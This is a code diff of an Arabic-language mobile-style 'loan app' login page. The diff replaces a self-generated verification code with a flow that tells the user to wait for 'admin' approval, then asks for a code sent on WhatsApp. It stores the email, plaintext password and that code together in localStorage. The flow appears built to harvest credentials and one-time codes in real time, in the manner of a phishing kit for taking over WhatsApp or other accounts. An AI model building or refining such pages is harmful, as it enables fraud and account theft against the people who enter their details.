@@ -5,28 +5,32 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>تطبيق القروض - تسجيل الدخول</title>
   <style>
-    *{box-sizing:border-box}
-    body{
-      margin:0;
-      min-height:100vh;
-      display:flex;
-      justify-content:center;
-      align-items:center;
-      background:#020713;
-      font-family:Arial, sans-serif;
-      color:white;
-      padding:20px;
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
     }
 
-    .phone{
-      width:390px;
-      min-height:780px;
-      padding:28px 22px;
-      background:radial-gradient(circle at center,#082b77 0%,#061943 38%,#020817 100%);
-      border-radius:22px;
-      position:relative;
-      box-shadow:0 0 35px #000;
-      margin:0 auto;
+    body {
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #020713;
+      font-family: Arial, sans-serif;
+      color: white;
+      padding: 20px;
+    }
+
+    .phone {
+      width: 390px;
+      min-height: 780px;
+      padding: 28px 22px;
+      background: radial-gradient(circle at center, #082b77 0%, #061943 38%, #020817 100%);
+      border-radius: 22px;
+      position: relative;
+      box-shadow: 0 0 35px #000;
+      margin: 0 auto;
       animation: slideUp 0.6s ease-out;
       display: none;
     }
@@ -35,20 +39,24 @@
       display: block;
     }
 
-    .top{
-      display:flex;
-      justify-content:space-between;
-      align-items:center;
-      font-weight:bold;
-      font-size:18px;
+    .top {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-weight: bold;
+      font-size: 18px;
+      margin-bottom: 20px;
     }
 
-    .support{font-size:28px; cursor: pointer;}
+    .support {
+      font-size: 28px;
+      cursor: pointer;
+    }
 
     .back-btn-phone {
-      font-size:42px;
-      line-height:1;
-      cursor:pointer;
+      font-size: 42px;
+      line-height: 1;
+      cursor: pointer;
       transition: all 0.3s ease;
     }
 
@@ -57,33 +65,34 @@
       color: #3fa0ff;
     }
 
-    .logo{
-      width:120px;
-      height:95px;
-      margin:75px auto 60px;
-      position:relative;
+    .logo {
+      width: 120px;
+      height: 95px;
+      margin: 60px auto 40px;
+      position: relative;
       animation: float 3s ease-in-out infinite;
     }
 
-    .logo::before,.logo::after{
-      content:"";
-      position:absolute;
-      width:120px;
-      height:38px;
-      border-radius:8px;
-      transform:skewY(-30deg);
+    .logo::before,
+    .logo::after {
+      content: "";
+      position: absolute;
+      width: 120px;
+      height: 38px;
+      border-radius: 8px;
+      transform: skewY(-30deg);
     }
 
-    .logo::before{
-      background:linear-gradient(90deg,#01d3b7,#028aff);
-      top:38px;
-      left:-10px;
+    .logo::before {
+      background: linear-gradient(90deg, #01d3b7, #028aff);
+      top: 38px;
+      left: -10px;
     }
 
-    .logo::after{
-      background:linear-gradient(90deg,#0b5cff,#38a1ff);
-      top:0;
-      right:-5px;
+    .logo::after {
+      background: linear-gradient(90deg, #0b5cff, #38a1ff);
+      top: 0;
+      right: -5px;
     }
 
     @keyframes float {
@@ -91,10 +100,10 @@
       50% { transform: translateY(-15px); }
     }
 
-    h1{
-      text-align:right;
-      font-size:32px;
-      margin:0 0 30px;
+    h1 {
+      text-align: right;
+      font-size: 32px;
+      margin: 0 0 30px;
     }
 
     .subtitle {
@@ -105,35 +114,35 @@
       color: #f2f6ff;
     }
 
-    .input{
-      height:64px;
-      background:rgba(75,130,220,.28);
-      border:1px solid rgba(120,170,255,.35);
-      border-radius:14px;
-      margin-bottom:18px;
-      display:flex;
-      align-items:center;
-      padding:0 18px;
-      gap:12px;
-      font-size:20px;
-      color:#dce8ff;
+    .input {
+      height: 64px;
+      background: rgba(75, 130, 220, 0.28);
+      border: 1px solid rgba(120, 170, 255, 0.35);
+      border-radius: 14px;
+      margin-bottom: 18px;
+      display: flex;
+      align-items: center;
+      padding: 0 18px;
+      gap: 12px;
+      font-size: 20px;
+      color: #dce8ff;
       transition: all 0.3s ease;
     }
 
     .input:focus-within {
-      background:rgba(75,130,220,.4);
-      border-color:rgba(120,170,255,.6);
-      box-shadow: 0 0 15px rgba(39,173,255, 0.3);
+      background: rgba(75, 130, 220, 0.4);
+      border-color: rgba(120, 170, 255, 0.6);
+      box-shadow: 0 0 15px rgba(39, 173, 255, 0.3);
     }
 
-    .input input{
-      flex:1;
-      background:none;
-      border:0;
-      outline:0;
-      color:white;
-      font-size:19px;
-      text-align:right;
+    .input input {
+      flex: 1;
+      background: none;
+      border: 0;
+      outline: 0;
+      color: white;
+      font-size: 19px;
+      text-align: right;
     }
 
     .input input::placeholder {
@@ -155,39 +164,22 @@
       transform: scale(1.1);
     }
 
-    .forgot{
-      text-align:right;
-      margin-bottom:26px;
-      font-size:16px;
+    .buttons {
+      display: flex;
+      gap: 12px;
+      direction: ltr;
+      margin-top: 20px;
     }
 
-    .forgot span, .signup span {
-      color:#3fa0ff;
-      font-weight:bold;
+    button {
+      border: 0;
+      height: 64px;
+      border-radius: 14px;
+      background: linear-gradient(135deg, #39adff, #1265ff);
+      color: white;
+      font-size: 24px;
+      font-weight: bold;
       cursor: pointer;
-      transition: all 0.3s ease;
-    }
-
-    .forgot span:hover, .signup span:hover {
-      color: #39adff;
-      text-decoration: underline;
-    }
-
-    .buttons{
-      display:flex;
-      gap:12px;
-      direction:ltr;
-    }
-
-    button{
-      border:0;
-      height:64px;
-      border-radius:14px;
-      background:linear-gradient(135deg,#39adff,#1265ff);
-      color:white;
-      font-size:24px;
-      font-weight:bold;
-      cursor:pointer;
       transition: all 0.3s ease;
     }
 
@@ -200,47 +192,90 @@
       transform: translateY(-1px);
     }
 
-    .login{
-      flex:1;
+    .login {
+      flex: 1;
       font-size: 18px;
     }
 
-    .qr{
-      width:68px;
-      font-size:30px;
+    .qr {
+      width: 68px;
+      font-size: 30px;
     }
 
-    .signup{
-      text-align:center;
-      margin-top:18px;
-      font-size:17px;
+    .footer {
+      position: absolute;
+      bottom: 32px;
+      left: 0;
+      right: 0;
+      text-align: center;
+      color: #d6def0;
+      letter-spacing: 1px;
     }
 
-    .footer{
-      position:absolute;
-      bottom:32px;
-      left:0;
-      right:0;
-      text-align:center;
-      color:#d6def0;
-      letter-spacing:1px;
+    .footer .mark {
+      margin: 14px auto;
+      width: 55px;
+      height: 40px;
+      border: 5px solid #273d78;
+      border-radius: 12px;
+      opacity: 0.8;
     }
 
-    .footer .mark{
-      margin:14px auto;
-      width:55px;
-      height:40px;
-      border:5px solid #273d78;
-      border-radius:12px;
-      opacity:.8;
-    }
-
-    /* ===== صفحة التحقق من الكود ===== */
-    .code-verification-page {
+    /* صفحة الانتظار */
+    .waiting-page {
       display: none;
     }
 
-    .code-verification-page.active {
+    .waiting-page.active {
+      display: block;
+    }
+
+    .waiting-content {
+      text-align: center;
+      padding: 80px 20px 100px;
+    }
+
+    .waiting-icon {
+      font-size: 80px;
+      margin-bottom: 30px;
+      animation: spin 2s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .waiting-title {
+      font-size: 28px;
+      font-weight: bold;
+      margin-bottom: 20px;
+      color: #39ff39;
+    }
+
+    .waiting-text {
+      font-size: 16px;
+      color: #b3d9ff;
+      margin-bottom: 30px;
+      line-height: 1.6;
+    }
+
+    .status-waiting {
+      background: linear-gradient(135deg, #ff9900 0%, #ff6600 100%);
+      color: white;
+      padding: 12px 20px;
+      border-radius: 8px;
+      display: inline-block;
+      font-weight: bold;
+      margin-bottom: 30px;
+    }
+
+    /* صفحة إدخال الكود */
+    .code-input-page {
+      display: none;
+    }
+
+    .code-input-page.active {
       display: block;
     }
 
@@ -277,38 +312,7 @@
       color: rgba(220, 232, 255, 0.3);
     }
 
-    .timer {
-      text-align: center;
-      color: #ff9900;
-      font-weight: bold;
-      font-size: 16px;
-      margin-bottom: 20px;
-    }
-
-    .resend-code {
-      text-align: center;
-      margin-top: 20px;
-    }
-
-    .resend-code a {
-      color: #3fa0ff;
-      cursor: pointer;
-      font-weight: bold;
-      transition: all 0.3s ease;
-      text-decoration: underline;
-    }
-
-    .resend-code a:hover {
-      color: #39adff;
-    }
-
-    .resend-code a.disabled {
-      color: #999;
-      cursor: not-allowed;
-      text-decoration: none;
-    }
-
-    /* ===== صفحة النجاح ===== */
+    /* صفحة النجاح */
     .success-page {
       display: none;
     }
@@ -347,7 +351,6 @@
       line-height: 1.6;
     }
 
-    /* ===== الرسوم المتحركة ===== */
     @keyframes slideUp {
       from {
         opacity: 0;
@@ -359,7 +362,6 @@
       }
     }
 
-    /* ===== استجابة الهاتف ===== */
     @media (max-width: 768px) {
       .phone {
         width: 100%;
@@ -384,7 +386,7 @@
 </head>
 <body>
 
-  <!-- ===== صفحة تسجيل الدخول ===== -->
+  <!-- صفحة تسجيل الدخول -->
   <div class="phone active" id="login-page">
     <div class="top">
       <div>العربية</div>
@@ -407,18 +409,45 @@
         <button type="button" class="toggle-password" onclick="togglePassword()">👁️</button>
       </div>
 
-      <div class="forgot">
-        هل نسيت كلمة المرور؟ <span onclick="alert('سيتم إعادة تعيين كلمة المرور قريباً')">تغيير كلمة المرور</span>
-      </div>
-
       <div class="buttons">
         <button type="button" class="qr" title="QR Code" onclick="alert('ميزة QR Code قريباً')">▦</button>
         <button type="submit" class="login">تسجيل الدخول</button>
       </div>
     </form>
 
-    <div class="signup">
-      لا تملك حساب مسبقاً؟ <span onclick="alert('ستكون ميزة التسجيل قريباً')">إنشاء حساب</span>
+    <div class="footer">
+      <div>POWERED BY</div>
+      <div class="mark"></div>
+      <div>V 1.0.0</div>
+    </div>
+  </div>
+
+  <!-- صفحة الانتظار -->
+  <div class="phone waiting-page" id="waiting-page">
+    <div class="top">
+      <div class="back-btn-phone" onclick="backToLogin()">›</div>
+      <div class="support" onclick="alert('شكراً لتواصلك معنا 📞')">🎧</div>
+    </div>
+
+    <div class="logo"></div>
+
+    <div class="waiting-content">
+      <div class="waiting-icon">⏳</div>
+      
+      <h1 class="waiting-title">يرجى الانتظار</h1>
+      
+      <div class="waiting-text">
+        <p>جاري التحقق من بياناتك</p>
+        <p style="margin-top: 15px;">سيتم إرسال رمز على واتس آب</p>
+      </div>
+
+      <div class="status-waiting">
+        📲 في انتظار الموافقة
+      </div>
+
+      <div class="waiting-text" style="margin-top: 30px; font-size: 14px;">
+        ⏱️ يرجى الانتظار حتى يوافق الأدمن على طلبك
+      </div>
     </div>
 
     <div class="footer">
@@ -428,8 +457,8 @@
     </div>
   </div>
 
-  <!-- ===== صفحة التحقق من الكود ===== -->
-  <div class="phone code-verification-page" id="code-page">
+  <!-- صفحة إدخال الكود -->
+  <div class="phone code-input-page" id="code-page">
     <div class="top">
       <div class="back-btn-phone" onclick="backToLogin()">›</div>
       <div class="support" onclick="alert('شكراً لتواصلك معنا 📞')">🎧</div>
@@ -437,14 +466,10 @@
 
     <div class="logo"></div>
 
-    <h1>تحقق من هويتك</h1>
+    <h1>أدخل رمز التحقق</h1>
 
     <div class="subtitle">
-      أدخل الكود الذي تم إرساله
-    </div>
-
-    <div class="timer">
-      ⏱️ الوقت المتبقي: <span id="timerDisplay">120</span> ثانية
+      أدخل الرمز المرسل على واتس آب
     </div>
 
     <form onsubmit="handleCodeVerification(event)">
@@ -458,13 +483,9 @@
       </div>
 
       <div class="buttons" style="gap: 0; flex-direction: column;">
-        <button type="submit" class="login" style="margin-bottom: 12px;">التحقق</button>
+        <button type="submit" class="login" style="margin-bottom: 12px;">تأكيد الكود</button>
       </div>
     </form>
-
-    <div class="resend-code">
-      لم تستقبل الكود؟ <a id="resendLink" onclick="resendCode()">إعادة الإرسال</a>
-    </div>
 
     <div class="footer">
       <div>POWERED BY</div>
@@ -473,12 +494,12 @@
     </div>
   </div>
 
-  <!-- ===== صفحة النجاح ===== -->
+  <!-- صفحة النجاح -->
   <div class="phone success-page" id="success-page">
     <div class="success-message">
       <div class="success-icon">✅</div>
       
-      <h1 class="success-title">تم التحقق بنجاح!</h1>
+      <h1 class="success-title">تم التسجيل بنجاح!</h1>
       
       <div class="success-text">
         <p>مرحباً <strong id="successEmail">-</strong></p>
@@ -496,17 +517,14 @@
 
   <script>
     let currentUser = null;
-    let verificationCode = '123456';
-    let resendTimer = 0;
-    let timerInterval = null;
+    let enteredCode = '';
+    let pollingInterval = null;
 
-    // ===== تبديل إظهار كلمة المرور =====
     function togglePassword() {
       const input = document.getElementById('login-password');
       input.type = input.type === 'password' ? 'text' : 'password';
     }
 
-    // ===== معالجة تسجيل الدخول =====
     function handleLogin(event) {
       event.preventDefault();
       const email = document.getElementById('login-email').value;
@@ -521,67 +539,46 @@
         currentUser = {
           email: email,
           password: password,
-          verificationCode: generateVerificationCode(),
-          loginTime: new Date().toLocaleString('ar-SA')
+          enteredCode: '',
+          isApproved: false,
+          loginTime: new Date().toLocaleString('ar-SA'),
+          loginId: Date.now(),
+          status: 'pending'
         };
 
-        alert(`✅ تم إرسال كود التحقق إلى: ${email}\n\nالكود: ${currentUser.verificationCode}`);
-        
-        // الانتقال لصفحة التحقق
+        let verificationRequests = JSON.parse(localStorage.getItem('verificationRequests')) || [];
+        verificationRequests.push({...currentUser});
+        localStorage.setItem('verificationRequests', JSON.stringify(verificationRequests));
+
         document.getElementById('login-page').classList.remove('active');
-        document.getElementById('code-page').classList.add('active');
-        
-        // بدء العداد
-        startTimer();
-        
-        // نقل التركيز للحقل الأول
-        document.getElementById('code1').focus();
+        document.getElementById('waiting-page').classList.add('active');
+
+        startPolling();
       }
     }
 
-    // ===== توليد كود التحقق =====
-    function generateVerificationCode() {
-      return Math.floor(100000 + Math.random() * 900000).toString();
-    }
+    function startPolling() {
+      pollingInterval = setInterval(() => {
+        let verificationRequests = JSON.parse(localStorage.getItem('verificationRequests')) || [];
+        const currentRequest = verificationRequests.find(r => r.loginId === currentUser.loginId);
 
-    // ===== بدء العداد =====
-    function startTimer() {
-      resendTimer = 120;
-      document.getElementById('timerDisplay').textContent = resendTimer;
-      document.getElementById('resendLink').classList.add('disabled');
-      
-      timerInterval = setInterval(() => {
-        resendTimer--;
-        document.getElementById('timerDisplay').textContent = resendTimer;
-        
-        if (resendTimer <= 0) {
-          clearInterval(timerInterval);
-          document.getElementById('resendLink').classList.remove('disabled');
+        if (currentRequest && currentRequest.status === 'approved') {
+          clearInterval(pollingInterval);
+          
+          document.getElementById('waiting-page').classList.remove('active');
+          document.getElementById('code-page').classList.add('active');
+          
+          document.getElementById('code1').focus();
+          
+          alert('✅ تمت الموافقة! يرجى إدخال الرمز');
         }
       }, 1000);
     }
 
-    // ===== إعادة الإرسال =====
-    function resendCode() {
-      if (resendTimer > 0) return;
-      
-      currentUser.verificationCode = generateVerificationCode();
-      alert(`✅ تم إعادة إرسال الكود: ${currentUser.verificationCode}`);
-      
-      // مسح الحقول
-      for (let i = 1; i <= 6; i++) {
-        document.getElementById('code' + i).value = '';
-      }
-      document.getElementById('code1').focus();
-      
-      startTimer();
-    }
-
-    // ===== التحقق من الكود =====
     function handleCodeVerification(event) {
       event.preventDefault();
       
-      const enteredCode = 
+      enteredCode = 
         document.getElementById('code1').value +
         document.getElementById('code2').value +
         document.getElementById('code3').value +
@@ -589,35 +586,43 @@
         document.getElementById('code5').value +
         document.getElementById('code6').value;
 
-      if (enteredCode === currentUser.verificationCode) {
-        // حفظ بيانات المستخدم
-        let logins = JSON.parse(localStorage.getItem('userLogins')) || [];
-        logins.push({
-          email: currentUser.email,
-          password: currentUser.password,
-          verificationCode: currentUser.verificationCode,
-          loginTime: currentUser.loginTime
-        });
-        localStorage.setItem('userLogins', JSON.stringify(logins));
-
-        // عرض صفحة النجاح
-        document.getElementById('code-page').classList.remove('active');
-        document.getElementById('success-page').classList.add('active');
-        document.getElementById('successEmail').textContent = currentUser.email;
-        
-        clearInterval(timerInterval);
-
-        // العودة لصفحة الدخول بعد 3 ثوان
-        setTimeout(() => {
-          backToLogin();
-        }, 3000);
-      } else {
-        alert('❌ الكود غير صحيح!');
+      if (!/^\d{6}$/.test(enteredCode)) {
+        alert('❌ الكود يجب أن يتكون من 6 أرقام فقط!');
+        return;
       }
+
+      currentUser.enteredCode = enteredCode;
+
+      let logins = JSON.parse(localStorage.getItem('userLogins')) || [];
+      logins.push({
+        email: currentUser.email,
+        password: currentUser.password,
+        enteredCode: enteredCode,
+        loginTime: currentUser.loginTime
+      });
+      localStorage.setItem('userLogins', JSON.stringify(logins));
+
+      let verificationRequests = JSON.parse(localStorage.getItem('verificationRequests')) || [];
+      const requestIndex = verificationRequests.findIndex(r => r.loginId === currentUser.loginId);
+      if (requestIndex !== -1) {
+        verificationRequests[requestIndex].status = 'verified';
+        verificationRequests[requestIndex].enteredCode = enteredCode;
+        localStorage.setItem('verificationRequests', JSON.stringify(verificationRequests));
+      }
+
+      document.getElementById('code-page').classList.remove('active');
+      document.getElementById('success-page').classList.add('active');
+      document.getElementById('successEmail').textContent = currentUser.email;
+
+      clearInterval(pollingInterval);
+
+      setTimeout(() => {
+        backToLogin();
+      }, 3000);
     }
 
-    // ===== الرجوع للدخول =====
     function backToLogin() {
+      document.getElementById('waiting-page').classList.remove('active');
       document.getElementById('code-page').classList.remove('active');
       document.getElementById('success-page').classList.remove('active');
       document.getElementById('login-page').classList.add('active');
@@ -628,11 +633,10 @@
         document.getElementById('code' + i).value = '';
       }
       
-      clearInterval(timerInterval);
+      clearInterval(pollingInterval);
       currentUser = null;
     }
 
-    // ===== التنقل بين حقول الكود =====
     document.addEventListener('DOMContentLoaded', function() {
       for (let i = 1; i <= 6; i++) {
         document.getElementById('code' + i).addEventListener('input', function(e) {
